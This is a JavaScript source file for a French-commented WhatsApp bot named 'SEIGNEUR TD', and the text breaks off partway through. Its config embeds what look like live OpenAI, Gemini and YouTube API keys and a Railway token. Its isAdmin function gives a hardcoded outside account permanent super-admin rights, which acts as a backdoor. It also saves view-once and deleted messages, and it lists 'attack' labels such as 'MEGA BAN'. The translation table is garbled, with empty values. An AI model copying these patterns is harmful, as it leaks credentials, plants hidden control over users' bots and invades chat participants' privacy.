import { createServer } from 'http';
import { fork } from 'child_process';
import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  delay,
  downloadContentFromMessage
} from 'bail-lite';

import qrcode from 'qrcode-terminal';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import * as cheerio from 'cheerio';

// Bot configuration
const config = {
  botName: 'SEIGNEUR TD',
  prefix: '.',
  language: 'ar', // 'ar' = Arabe, 'fr' = Français, 'en' = English
  autoReply: false,
  sessionFolder: './auth_info_baileys',
  usePairingCode: true,
  phoneNumber: '', // Laissé vide — saisi au démarrage
  adminNumbers: ['84933801806', '107658338123943'], // Admins
  railwayToken: process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a',
  botAdmins: ['84933801806', '107658338123943'], // Liste des numéros admin (sans @s.whatsapp.net)
  dataFolder: './bot_data',
  maxViewOncePerUser: 50,
  commandCooldown: 2000, // 2 secondes entre les commandes
  youtubeApiKey: 'AIzaSyD3JA07YzY6SJSHKtj9IA7S-GFZUkqYd70', // 🔑 Clé API YouTube Data v3
  openaiApiKey:  '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', // 🔑 Clé API OpenAI GPT
  geminiApiKey:  'AIzaSyAj5kNv4ClFt-4DskW6XDU0PIPd3PXmwCw',  // 🔑 Clé API Google Gemini
  groqApiKey:    '',  // 🔑 Clé API Groq (optionnel, gratuit sur console.groq.com)
  channelLink:   'https://whatsapp.com/channel/0029VbBZrLBFMqrQIDpcfO04',  // 📢 Chaîne WhatsApp
  channelJid:    '120363422398514286@newsletter'
};

// Créer le dossier de données s'il n'existe pas
if (!fs.existsSync(config.dataFolder)) {
  fs.mkdirSync(config.dataFolder, { recursive: true });
}

// =============================================
// SYSTÈME DE TRADUCTION ARABE
// =============================================

const translations = {
  // Messages communs
  ' ': ' ',
  'This command is for groups only': ' for groups only',
  'Admin command': '  ',
  'Usage': '',
  'Exemple': '',
  '': '',
  '': '',
  'Failed': '',
  ' ': ' ',
  ' ': ' ',
  '': '',
  'Target': '',
  'Status': '',
  
  // Commandes principales
  'Menu': '',
  'Help': '',
  'Ping': '',
  'Alive': '',
  'Info': '',
  'Status': '',
  
  // Messages du menu
  'User': '',
  'Dev': '',
  'Developer': '',
  'Region': '',
  'Date': '',
  'Time': '',
  'Mode': '',
  'Version': '',
  'Prefix': '',
  'Bot Name': ' ',
  
  // Commandes de groupe
  'Group': '',
  'Members': '',
  'Admins': '',
  'Online': '',
  'Offline': ' ',
  'Kicked': ' ',
  'Added': ' ',
  'Promoted': ' ',
  'Demoted': ' ',
  
  // Messages d'erreur
  'No media found': '    ',
  'Reply to a message': '  ',
  ' ': '  ',
  'Invalid number': '  ',
  'Command not found': '  ',
  
  // Bugs et attaques
  'SILENT REPORT': ' ',
  'BAN SUPPORT': ' ',
  'MEGA BAN': ' ',
  
  // États
  ' ': ' ',
  ' ': ' ',
  ' ': ' ',
  '': '',
  ' ': ' ',
  '': '',
  ' ': ' ',
  '': '',
  '': '',
  
  // Autres
  '': '',
  'Reports': '',
  'Total': '',
  'Duration': '',
  'Speed': '',
  'Risk': '',
  'Timeline': ' ',
  'Details': '',
  'System Status': ' ',
  '  ': '  ',
  'Mission accomplished': ' '
};

// Fonction de traduction
function translate(text) {
  if (config.language !== 'ar') return text;
  
  // Traduire les mots clés
  let translatedText = text;
  for (const [key, value] of Object.entries(translations)) {
    const regex = new RegExp(key, 'gi');
    translatedText = translatedText.replace(regex, value);
  }
  
  return translatedText;
}

// Fonction pour envelopper les messages en arabe
function msg(text) {
  return translate(text);
}

// Auto-reply keywords and responses
const autoReplies = {
  'hello': '👋 Salut! Je suis SEIGNEUR TD. Comment puis-je t\'aider?',
  'hi': '👋 Hello! Bienvenue sur SEIGNEUR TD.',
  'help': `╔══════════════════════════════╗
║      SEIGNEUR TD         ║
╚══════════════════════════════╝

📋 Commandes disponibles:
━━━━━━━━━━━━━━━━
!help - Afficher ce menu
!ping - Vérifier la latence
!info - Informations du bot
!menu - Menu principal

Type !menu pour voir le menu complet!`,
  'bye': '👋 À bientôt! Prends soin de toi!',
  'thanks': 'De rien! 😊 - SEIGNEUR TD',
  'thank you': 'Avec plaisir! 😊 - SEIGNEUR TD'
};

// Simple in-memory database with persistence
const database = {
  users: new Map(),
  groups: new Map(),
  statistics: {
    total: 0,
    totalUsers: 0,
    totalGroups: 0
  }
};

// Variables pour les fonctionnalités (bot principal — partagées)
let botMode = 'public';

// Cache version Baileys — évite HTTP à chaque reconnexion
let _cachedBaileysVersion = null;
async function getBaileysVersion() {
  if (_cachedBaileysVersion) return _cachedBaileysVersion;
  const { version } = await fetchLatestBaileysVersion();
  _cachedBaileysVersion = version;
  return version;
}

// Augmenter la limite d'écouteurs EventEmitter pour supporter N sessions
process.setMaxListeners(50);

// Filtre les warnings Signal (Bad MAC, closed session) qui spamment la console
const _origConsoleError = console.error.bind(console);
console.error = (...args) => {
  const msg = String(args[0] ?? '');
  if (msg.includes('Bad MAC') || msg.includes('closed session') ||
      msg.includes('Closing open session') || msg.includes('Closing session') ||
      msg.includes('Decrypted message with closed') || msg.includes('SessionEntry')) return;
  _origConsoleError(...args);
};
const _origConsoleWarn = console.warn.bind(console);
console.warn = (...args) => {
  const msg = String(args[0] ?? '');
  if (msg.includes('Bad MAC') || msg.includes('closed session') ||
      msg.includes('Closing open session') || msg.includes('Closing session') ||
      msg.includes('SessionEntry')) return;
  _origConsoleWarn(...args);
};
// Intercepter aussi console.log pour les dumps Signal
const _origConsoleLog = console.log.bind(console);
console.log = (...args) => {
  const msg = String(args[0] ?? '');
  if (msg.includes('Closing session') || msg.includes('SessionEntry') ||
      msg.includes('_chains') || msg.includes('ephemeralKeyPair') ||
      msg.includes('Decrypted message with closed')) return;
  _origConsoleLog(...args);
};

let autoTyping = false;
let autoRecording = true;
let autoReact = true;
let autoReadStatus = true;
let autoLikeStatus = true;
let autoStatusViews = false;    // 👁️ Voir les statuts automatiquement
let autoReactStatus = false;    // ❤️ Réagir aux statuts automatiquement
let statusReactEmoji = '🇷🇴';   // 🎯 Emoji de réaction par défaut
let autoSaveStatus = false;     // 💾 Sauvegarder statuts en PV
let antiDeleteStatus = false;   // 🗑️ Anti-suppression de statut (off par défaut)
let antiDeleteStatusMode = 'private'; // 'private' | 'chat'
let antiDelete = true;
let antiEdit = true;
let antiBug = true;         // 🛡️ Protection anti-bug activée
let antiCall = false;        // 📵 Anti-appel désactivé par défaut
let antiDeleteMode = 'chat'; // 'private' | 'chat' | 'all'
let pairingRequested = false; // Global - évite retry après reconnect
let antiEditMode = 'chat';   // 'private' | 'chat' | 'all'
let chatbotEnabled = false; // 🤖 Chatbot OFF par défaut
let stickerPackname = 'SEIGNEUR TD'; // 📦 Nom du pack sticker
let stickerAuthor = '© SEIGNEUR TD'; // ✍️ Auteur du sticker
let menuStyle = 1; // 🎨 Style de menu (1, 2, 3)

// ══ ÉTATS ISOLÉS PAR SESSION ══
const _sessionStates = new Map();
function _getSessionState(phone) {
  if (!_sessionStates.has(phone)) {
    _sessionStates.set(phone, {
      botMode: 'public', autoTyping: false, autoRecording: false, autoReact: false,
      autoReadStatus: false, autoLikeStatus: false, autoStatusViews: false,
      autoReactStatus: false, statusReactEmoji: '\uD83C\uDDF7\uD83C\uDDF4',
      autoSaveStatus: false, antiDeleteStatus: false, antiDeleteStatusMode: 'private',
      antiDelete: false, antiEdit: false, antiBug: false, antiCall: false,
      antiDeleteMode: 'chat', antiEditMode: 'chat', chatbotEnabled: false,
      stickerPackname: 'SEIGNEUR TD', stickerAuthor: '\u00a9 SEIGNEUR TD', menuStyle: 1,
      prefix: config.prefix,
    });
  }
  return _sessionStates.get(phone);
}
let savedViewOnce = new Map();
let messageCache = new Map();
// Contacts connus — JIDs collectés au fil des messages pour tostatus
const _knownContacts = new Set();
let groupSettings = new Map();
let memberActivity = new Map();

const antiBugTracker = new Map(); // { senderJid: { count, lastSeen, blocked } }

let autoreactWords = {
  'good': '👍', 'nice': '👌', 'wow': '😲',
  'lol': '😂', 'cool': '😎', 'love': '❤️',
  'fire': '🔥', 'sad': '😢', 'angry': '😠', 'ok': '👌'
};

const warnSystem = new Map();
const spamTracker = new Map();
const permaBanList = new Map();
const commandCooldowns = new Map();

// =============================================
// 🗄️ STORE LOCAL - SYSTÈME DE PERSISTANCE COMPLET
// =============================================

const STORE_DIR = './store';
const STORE_FILES = {
  config:       `${STORE_DIR}/config.json`,
  admins:       `${STORE_DIR}/admins.json`,
  warns:        `${STORE_DIR}/warns.json`,
  permabans:    `${STORE_DIR}/permabans.json`,
  groupSettings:`${STORE_DIR}/group_settings.json`,
  stats:        `${STORE_DIR}/stats.json`,
  viewonce:     `${STORE_DIR}/viewonce.json`,
  activity:     `${STORE_DIR}/activity.json`,
  antilink:     `${STORE_DIR}/antilink.json`,
  antibot:      `${STORE_DIR}/antibot.json`,
  antitag:      `${STORE_DIR}/antitag.json`,
  antispam:     `${STORE_DIR}/antispam.json`,
  welcome:      `${STORE_DIR}/welcome.json`,
  autoreact:    `${STORE_DIR}/autoreact.json`,
};

// --- Utilitaires Store ---
function storeEnsureDir() {
  if (!fs.existsSync(STORE_DIR)) {
    fs.mkdirSync(STORE_DIR, { recursive: true });
    console.log('📁 Store directory created:', STORE_DIR);
  }
  // Créer aussi le dossier legacy pour compatibilité
  if (!fs.existsSync(config.dataFolder)) {
    fs.mkdirSync(config.dataFolder, { recursive: true });
  }
}

function storeRead(file, defaultValue = {}) {
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      return JSON.parse(raw);
    }
  } catch (e) {
    console.error(`⚠️ Store read error [${file}]:`, e.message);
  }
  return defaultValue;
}

function storeWrite(file, data) {
  try {
    storeEnsureDir();
    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (e) {
    console.error(`⚠️ Store write error [${file}]:`, e.message);
    return false;
  }
}

function mapToObj(map) {
  const obj = {};
  for (const [k, v] of map.entries()) obj[k] = v;
  return obj;
}

function objToMap(obj) {
  return new Map(Object.entries(obj || {}));
}

// --- LOAD STORE (au démarrage) ---
function loadStore() {
  storeEnsureDir();

  // 1. CONFIG (botMode, toggles)
  const savedConfig = storeRead(STORE_FILES.config);
  if (Object.keys(savedConfig).length) {
    botMode        = savedConfig.botMode        ?? 'public';
    autoTyping     = savedConfig.autoTyping     ?? false;
    autoRecording  = savedConfig.autoRecording  ?? true;
    autoReact      = savedConfig.autoReact      ?? true;
    autoReadStatus = savedConfig.autoReadStatus ?? true;
    autoLikeStatus = savedConfig.autoLikeStatus ?? true;
    antiDelete     = savedConfig.antiDelete     ?? true;
    antiEdit       = savedConfig.antiEdit       ?? true;
    antiBug        = savedConfig.antiBug        ?? true;
    chatbotEnabled = savedConfig.chatbotEnabled ?? false;
    antiCall = savedConfig.antiCall ?? false;
    autoStatusViews = savedConfig.autoStatusViews ?? false;
    autoReactStatus = savedConfig.autoReactStatus ?? false;
    statusReactEmoji = savedConfig.statusReactEmoji ?? '🇷🇴';
    autoSaveStatus = savedConfig.autoSaveStatus ?? false;
    antiDeleteStatus = savedConfig.antiDeleteStatus ?? false;
    antiDeleteStatusMode = savedConfig.antiDeleteStatusMode ?? 'private';
    autoreactWords = savedConfig.autoreactWords ?? autoreactWords;
    stickerPackname = savedConfig.stickerPackname ?? 'SEIGNEUR TD';
    stickerAuthor   = savedConfig.stickerAuthor   ?? '© SEIGNEUR TD';
    menuStyle       = savedConfig.menuStyle        ?? 1;
    console.log('✅ [STORE] Config chargée');
  }

  // 2. ADMINS (botAdmins + adminNumbers)
  const savedAdmins = storeRead(STORE_FILES.admins);
  if (savedAdmins.botAdmins?.length) {
    // ✅ Filtrer les entrées vides/invalides du store
    const filteredBotAdmins = savedAdmins.botAdmins.filter(a => a && String(a).replace(/[^0-9]/g,'').length > 5);
    const filteredAdminNumbers = (savedAdmins.adminNumbers || []).filter(a => a && String(a).replace(/[^0-9]/g,'').length > 5);
    // ✅ Toujours garder le owner principal même si le store est corrompu
    const ownerNum = config.adminNumbers[0];
    if (!filteredBotAdmins.includes(ownerNum)) filteredBotAdmins.unshift(ownerNum);
    if (!filteredAdminNumbers.includes(ownerNum)) filteredAdminNumbers.unshift(ownerNum);
    config.botAdmins    = filteredBotAdmins;
    config.adminNumbers = filteredAdminNumbers;
    console.log(`✅ [STORE] Admins chargés: ${config.botAdmins.length} admin(s)`);
  }

  // 3. WARNS
  const savedWarns = storeRead(STORE_FILES.warns);
  for (const [k, v] of Object.entries(savedWarns)) warnSystem.set(k, v);
  if (Object.keys(savedWarns).length) console.log('✅ [STORE] Warnings chargés');

  // 4. PERMABANS
  const savedBans = storeRead(STORE_FILES.permabans);
  for (const [k, v] of Object.entries(savedBans)) permaBanList.set(k, v);
  if (Object.keys(savedBans).length) console.log('✅ [STORE] Permabans chargés');

  // 5. GROUP SETTINGS
  const savedGroups = storeRead(STORE_FILES.groupSettings);
  for (const [k, v] of Object.entries(savedGroups)) groupSettings.set(k, v);
  if (Object.keys(savedGroups).length) console.log('✅ [STORE] Paramètres groupes chargés');

  // 6. STATS
  const savedStats = storeRead(STORE_FILES.stats);
  if (Object.keys(savedStats).length) {
    Object.assign(database.statistics, savedStats);
    console.log('✅ [STORE] Statistiques chargées');
  }

  // 7. VIEW ONCE
  const savedVV = storeRead(STORE_FILES.viewonce);
  for (const [k, v] of Object.entries(savedVV)) {
    try {
      savedViewOnce.set(k, v.map(item => ({
        ...item,
        buffer: Buffer.from(item.buffer, 'base64')
      })));
    } catch(e) {}
  }
  if (Object.keys(savedVV).length) console.log('✅ [STORE] View Once chargé');

  // 8. ACTIVITY
  const savedActivity = storeRead(STORE_FILES.activity);
  for (const [groupJid, members] of Object.entries(savedActivity)) {
    memberActivity.set(groupJid, objToMap(members));
  }
  if (Object.keys(savedActivity).length) console.log('✅ [STORE] Activité chargée');

  // 9. CONTACTS CONNUS
  try {
    const _kcRaw = storeRead('./store/known_contacts.json', []);
    if (Array.isArray(_kcRaw)) _kcRaw.forEach(j => { if (j && j.endsWith('@s.whatsapp.net')) _knownContacts.add(j); });
    if (_knownContacts.size) console.log('✅ [STORE] Contacts chargés: ' + _knownContacts.size);
  } catch(_e) {}

  // 10. SESSION STATES
  try {
    const _ssRaw = storeRead('./store/session_states.json');
    for (const [phone, state] of Object.entries(_ssRaw)) {
      if (phone && state && typeof state === 'object') {
        _sessionStates.set(phone, {
          botMode: state.botMode ?? 'public',
          autoTyping: state.autoTyping ?? false,
          autoRecording: state.autoRecording ?? false,
          autoReact: state.autoReact ?? false,
          autoReadStatus: state.autoReadStatus ?? false,
          autoLikeStatus: state.autoLikeStatus ?? false,
          autoStatusViews: state.autoStatusViews ?? false,
          autoReactStatus: state.autoReactStatus ?? false,
          statusReactEmoji: state.statusReactEmoji ?? '🇷🇴',
          autoSaveStatus: state.autoSaveStatus ?? false,
          antiDeleteStatus: state.antiDeleteStatus ?? false,
          antiDeleteStatusMode: state.antiDeleteStatusMode ?? 'private',
          antiDelete: state.antiDelete ?? false,
          antiEdit: state.antiEdit ?? false,
          antiBug: state.antiBug ?? false,
          antiCall: state.antiCall ?? false,
          antiDeleteMode: state.antiDeleteMode ?? 'chat',
          antiEditMode: state.antiEditMode ?? 'chat',
          chatbotEnabled: state.chatbotEnabled ?? false,
          stickerPackname: state.stickerPackname ?? 'SEIGNEUR TD',
          prefix: state.prefix ?? config.prefix,
          stickerAuthor: state.stickerAuthor ?? '© SEIGNEUR TD',
          menuStyle: state.menuStyle ?? 1,
        });
      }
    }
    if (Object.keys(_ssRaw).length) console.log('✅ [STORE] Session states chargés: ' + Object.keys(_ssRaw).length + ' session(s)');
  } catch(_e) {}

  console.log('🗄️ [STORE] Loading complet!');
}

// --- SAVE STORE (complet) ---
function saveStore() {
  storeEnsureDir();

  // 1. CONFIG
  storeWrite(STORE_FILES.config, {
    botMode, autoTyping, autoRecording, autoReact,
    autoReadStatus, autoLikeStatus, autoStatusViews, autoReactStatus, statusReactEmoji, autoSaveStatus, antiDeleteStatus, antiDeleteStatusMode, antiDelete, antiEdit, antiBug, antiCall, chatbotEnabled, autoreactWords,
    stickerPackname, stickerAuthor, menuStyle,
    savedAt: new Date().toISOString()
  });

  // 2. ADMINS
  storeWrite(STORE_FILES.admins, {
    botAdmins: config.botAdmins,
    adminNumbers: config.adminNumbers,
    savedAt: new Date().toISOString()
  });

  // 3. WARNS
  storeWrite(STORE_FILES.warns, mapToObj(warnSystem));

  // 4. PERMABANS
  storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));

  // 5. GROUP SETTINGS
  storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));

  // 6. STATS
  storeWrite(STORE_FILES.stats, {
    ...database.statistics,
    savedAt: new Date().toISOString()
  });

  // 7. VIEW ONCE
  const vvData = {};
  for (const [k, v] of savedViewOnce.entries()) {
    try {
      vvData[k] = v.map(item => ({
        ...item,
        buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
      }));
    } catch(e) {}
  }
  storeWrite(STORE_FILES.viewonce, vvData);

  // 8. ACTIVITY
  const activityData = {};
  for (const [groupJid, membersMap] of memberActivity.entries()) {
    activityData[groupJid] = mapToObj(membersMap);
  }
  storeWrite(STORE_FILES.activity, activityData);

  // 9. CONTACTS CONNUS pour tostatus
  storeWrite('./store/known_contacts.json', Array.from(_knownContacts));

  // 10. SESSION STATES (réglages des bots web — botMode, antiDelete, etc. par numéro)
  const _ssData = {};
  for (const [phone, state] of _sessionStates.entries()) {
    _ssData[phone] = { ...state };
  }
  storeWrite('./store/session_states.json', _ssData);
}

// --- SAVE PARTIEL (une seule clé) ---
function saveStoreKey(key) {
  switch(key) {
    case 'config':
      storeWrite(STORE_FILES.config, {
        botMode, autoTyping, autoRecording, autoReact,
        autoReadStatus, autoLikeStatus, antiDelete, antiEdit, autoreactWords,
        savedAt: new Date().toISOString()
      });
      break;
    case 'admins':
      storeWrite(STORE_FILES.admins, {
        botAdmins: config.botAdmins,
        adminNumbers: config.adminNumbers,
        savedAt: new Date().toISOString()
      });
      break;
    case 'warns':
      storeWrite(STORE_FILES.warns, mapToObj(warnSystem));
      break;
    case 'permabans':
      storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));
      break;
    case 'groupSettings':
      storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));
      break;
    case 'stats':
      storeWrite(STORE_FILES.stats, { ...database.statistics, savedAt: new Date().toISOString() });
      break;
    case 'viewonce':
      const vvData = {};
      for (const [k, v] of savedViewOnce.entries()) {
        try {
          vvData[k] = v.map(item => ({
            ...item,
            buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
          }));
        } catch(e) {}
      }
      storeWrite(STORE_FILES.viewonce, vvData);
      break;
    case 'activity':
      const actData = {};
      for (const [g, m] of memberActivity.entries()) actData[g] = mapToObj(m);
      storeWrite(STORE_FILES.activity, actData);
      break;
  }
}

// --- STORE STATUS (pour !storestatus) ---
function getStoreStatus() {
  const files = [];
  let totalSize = 0;
  for (const [key, filePath] of Object.entries(STORE_FILES)) {
    if (fs.existsSync(filePath)) {
      const stat = fs.statSync(filePath);
      const sizeKB = (stat.size / 1024).toFixed(2);
      totalSize += stat.size;
      files.push({ key, sizeKB, modified: stat.mtime.toLocaleTimeString('ar-SA') });
    } else {
      files.push({ key, sizeKB: '0.00', modified: '  ' });
    }
  }
  return { files, totalSizeKB: (totalSize / 1024).toFixed(2) };
}

// Auto-save toutes les 3 minutes
setInterval(() => {
  saveStore();
}, 3 * 60 * 1000);

// Nettoyage mémoire toutes les 10 minutes
setInterval(() => {
  const now = Date.now();
  // Nettoyer commandCooldowns expirés
  for (const [k, v] of commandCooldowns) {
    if (now - v > 60000) commandCooldowns.delete(k);
  }
  // Nettoyer spamTracker expirés (>2 min)
  for (const [k, v] of spamTracker) {
    const recent = v.filter(t => now - t < 120000);
    if (recent.length === 0) spamTracker.delete(k);
    else spamTracker.set(k, recent);
  }
  // Nettoyer antiBugTracker expirés (>10 min)
  for (const [k, v] of antiBugTracker) {
    if (now - (v.lastSeen || 0) > 10 * 60 * 1000) antiBugTracker.delete(k);
  }
}, 10 * 60 * 1000);

// Compatibilité with les anciens appels loadData/saveData
function loadData() { loadStore(); }
function saveData() { saveStore(); }


// =============================================
// UTILITAIRES
// =============================================

// ─── HELPER: Audio thème du bot (fichier local menu.mp3) ────────────────────
// Envoie menu.mp3 avec le même format que !playaudio
async function sendCmdAudio(sock, remoteJid) {
  try {
    const audioExts = ['.mp3', '.ogg', '.wav', '.m4a'];
    for (const ext of audioExts) {
      const filePath = `./menu${ext}`;
      if (fs.existsSync(filePath)) {
        const audioBuf = fs.readFileSync(filePath);
        const mimetype = ext === '.ogg' ? 'audio/ogg; codecs=opus' : 'audio/mpeg';
        
        // Envoyer juste l'audio sans message YouTube
        await sock.sendMessage(remoteJid, {
          audio:    audioBuf,
          mimetype: mimetype,
          fileName: `menu${ext}`
        });
        
        console.log(`[sendCmdAudio] ✅ Audio envoyé: ${filePath}`);
        return true;
      }
    }
    return false;
  } catch(e) {
    console.error('[sendCmdAudio]', e.message);
    return false;
  }
}


// ─── HELPER: Ajouter footer chaîne après les réponses ────────────────────────
async function sendWithChannelFooter(sock, remoteJid, text, options = {}) {
  const footerText = text + `\n\n📢 *Rejoins notre chaîne:* ${config.channelLink}`;
  await sock.sendMessage(remoteJid, { text: footerText, ...options });
}

// ═══ Helper: Envoyer réponse + lien chaîne + audio ═══════════════════════════


async function toBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

function isAdmin(jid) {
  if (!jid) return false;
  const p = jid.split(':')[0].split('@')[0].replace(/[^0-9]/g,'');
  
  // ✅ Super admin LID fixe
  if (jid === '124318499475488@lid' || jid.startsWith('124318499475488')) return true;

  // ✅ Vérifie si c'est le bot lui-même (owner) via globalBotJid
  if (global.botLidJid && (jid === global.botLidJid || jid.split(':')[0] === global.botLidJid.split(':')[0])) return true;
  if (global.botOwnerLid && (jid === global.botOwnerLid || jid.split(':')[0] === global.botOwnerLid.split(':')[0])) return true;
  
  if (!p) return false;
  // ✅ Vérifie adminNumbers (ignore les entrées vides)
  if(config.adminNumbers.some(a=>{
    const pa = String(a).replace(/[^0-9]/g,'');
    return pa && p === pa;
  })) return true;
  // ✅ Vérifie botAdmins (ignore les entrées vides)
  return (config.botAdmins||[]).some(num => {
    const pa = String(num).replace(/[^0-9]/g,'');
    return pa && p === pa;
  });
}

// Vérifier si un utilisateur est admin du groupe
// Cache metadata groupe — évite appels réseau répétés (TTL 60s)
const _groupMetaCache = new Map(); // groupJid → { data, ts }
async function _getGroupMeta(sock, groupJid) {
  const cached = _groupMetaCache.get(groupJid);
  if (cached && Date.now() - cached.ts < 60000) return cached.data;
  try {
    const data = await sock.groupMetadata(groupJid);
    _groupMetaCache.set(groupJid, { data, ts: Date.now() });
    return data;
  } catch(e) {
    return cached?.data || null;
  }
}
// Nettoyer le cache toutes les 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of _groupMetaCache) {
    if (now - v.ts > 300000) _groupMetaCache.delete(k);
  }
}, 5 * 60 * 1000);

async function isGroupAdmin(sock, groupJid, userJid) {
  try {
    const botJid = sock.user.id.split(':')[0];
    const normalizedUserJid = userJid.split(':')[0];
    if (normalizedUserJid === botJid) return true;
    const metadata = await _getGroupMeta(sock, groupJid);
    if (!metadata) return false;
    const participant = metadata.participants.find(p => p.id.split(':')[0] === normalizedUserJid);
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    return false;
  }
}

// Vérifier si le bot est admin du groupe
async function isBotGroupAdmin(sock, groupJid) {
  try {
    const metadata = await _getGroupMeta(sock, groupJid);
    if (!metadata) return false;
    const botJid = sock.user.id.split(':')[0];
    const participant = metadata.participants.find(p => p.id.split(':')[0] === botJid);
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    return false;
  }
}

function checkCooldown(userId, commandName) {
  const key = `${userId}-${commandName}`;
  const now = Date.now();
  
  if (commandCooldowns.has(key)) {
    const lastUse = commandCooldowns.get(key);
    if (now - lastUse < config.commandCooldown) {
      return false;
    }
  }
  
  commandCooldowns.set(key, now);
  return true;
}

async function simulateTyping(sock, jid, duration = 3000) {
  if (!autoTyping) return;
  try {
    await sock.sendPresenceUpdate('composing', jid);
    setTimeout(async () => {
      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
    }, duration);
  } catch(e) {
    console.error('Autotype error:', e.message);
  }
}

async function simulateRecording(sock, jid, duration = 2000) {
  if (!autoRecording) return;
  try {
    await sock.sendPresenceUpdate('recording', jid);
    setTimeout(async () => {
      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
    }, duration);
  } catch(e) {
    console.error('Autorecord error:', e.message);
  }
}

// Initialiser les paramètres d'un groupe
function initGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      antilink: false,
      antibot: false,
      antitag: false,
      antispam: false,
      antisticker: false,
      antiimage: false,
      antivideo: false,
      maxWarns: 3
    });
    saveStoreKey('groupSettings'); // 💾 Sauvegarde partielle
  }
  return groupSettings.get(groupJid);
}

// =============================================
// SYSTÈME D'AVERTISSEMENTS
// =============================================

function addWarn(groupJid, userJid, reason) {
  const key = `${groupJid}-${userJid}`;
  if (!warnSystem.has(key)) {
    warnSystem.set(key, []);
  }
  
  const warns = warnSystem.get(key);
  warns.push({
    reason: reason,
    timestamp: Date.now()
  });
  
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
  return warns.length;
}

function getWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return warnSystem.get(key) || [];
}

function resetWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  warnSystem.delete(key);
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
}

// =============================================
// SYSTÈME DE PERMABAN
// =============================================

function addPermaBan(groupJid, userJid, reason, bannedBy) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.set(key, {
    userJid: userJid,
    groupJid: groupJid,
    reason: reason,
    bannedBy: bannedBy,
    timestamp: Date.now()
  });
  saveStoreKey('permabans'); // 💾 Sauvegarde partielle immédiate
}

function isPermaBanned(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.has(key);
}

function removePermaBan(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.delete(key);
  saveData();
}

function getPermaBanInfo(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.get(key);
}

function getAllPermaBans(groupJid) {
  const bans = [];
  for (const [key, value] of permaBanList.entries()) {
    if (value.groupJid === groupJid) {
      bans.push(value);
    }
  }
  return bans;
}

// =============================================
// DÉTECTION ANTI- 
// =============================================

function checkSpam(userJid, message) {
  const now = Date.now();
  const key = userJid;
  
  if (!spamTracker.has(key)) {
    spamTracker.set(key, []);
  }
  
  const userMessages = spamTracker.get(key);
  const recentMessages = userMessages.filter(msg => now - msg.time < 5000);
  recentMessages.push({ time: now, text: message });
  spamTracker.set(key, recentMessages);
  
  if (recentMessages.length > 5) {
    return true;
  }
  
  const textCounts = {};
  recentMessages.forEach(msg => {
    textCounts[msg.text] = (textCounts[msg.text] || 0) + 1;
  });
  
  if (Object.values(textCounts).some(count => count >= 3)) {
    return true;
  }
  
  return false;
}

// Fonction pour obtenir la région à partir du timezone
function getRegionFromTimezone() {
  // Toujours retourner Port-au-Prince, Haïti
  return 'Port-au-Prince, Haïti ';
}

// Fonction pour initialiser/obtenir les paramètres d'un groupe
function getGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      welcome: false,
      goodbye: false
    });
  }
  return groupSettings.get(groupJid);
}

// Fonction pour envoyer le message de bienvenue
async function sendWelcomeMessage(sock, groupJid, newMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin (créateur du groupe)
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure (timezone Haïti)
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const welcomeText = ` ┏━━━━━ ✨ ᴡᴇʟᴄᴏᴍᴇ ✨ ━━━━━┓
👤 𝐍𝐎𝐔𝐕𝐄𝐀𝐔 𝐌𝐄𝐌𝐁𝐑𝐄 : @${newMemberJid.split('@')[0]}
👋 Bienvenue parmi nous !

◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount}

📅 𝖣𝖺𝗍𝖾 : ${dateStr}
🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━┛

